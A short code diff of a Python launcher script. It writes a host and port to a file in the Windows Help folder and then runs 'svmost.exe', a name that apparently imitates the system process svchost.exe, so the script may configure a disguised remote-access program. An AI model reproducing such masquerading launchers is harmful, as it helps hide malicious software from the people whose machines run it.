@@ -2,7 +2,7 @@ import sys
 import os
 
 conf_path="C:\WINDOWS\Help\wmconf"
-exe_path="C:\WINDOWS\Help\svmost.exe"
+exe_command="C:\WINDOWS\Help\svmost.exe local"
 host=""
 port=""
 
@@ -17,7 +17,7 @@ def main():
         cfp.write(host)
         cfp.write("\n")
         cfp.write(port)
-    os.system(exe_path + " local")
+    os.system(exe_command)
 
 if __name__ == '__main__':
     main()
